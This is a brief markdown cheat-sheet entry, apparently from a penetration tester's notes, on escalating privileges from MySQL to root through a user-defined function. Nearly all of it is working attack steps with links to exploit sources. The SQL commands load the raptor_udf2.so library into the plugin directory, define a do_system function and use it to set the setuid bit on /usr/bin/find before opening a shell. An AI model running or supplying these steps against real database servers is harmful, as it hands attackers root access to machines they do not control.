# mysql

## MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit

Tested: v5.0.77

```bash
# download UDF from msf | https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
https://github.sofianehamlaoui.fr/Security-Cheatsheets/databases/mysql/mysql-root-to-system-root/
commands: https://gist.github.com/p0c/8587757

[OR]
https://www.exploit-db.com/exploits/1518
use mysql;
CREATE table kashz(line blob);
INSERT INTO kashz VALUES(load_file('/PATH/raptor_udf2.so'));
SELECT * from kashz into dumpfile '/PLUGIN-DIR/raptor_udf2.so';
CREATE function do_system returns integer soname 'raptor_udf2.so';
SELECT * from mysql.func;
SELECT do_system('chmod +s /usr/bin/find');
\! sh 
# terminal commands
```
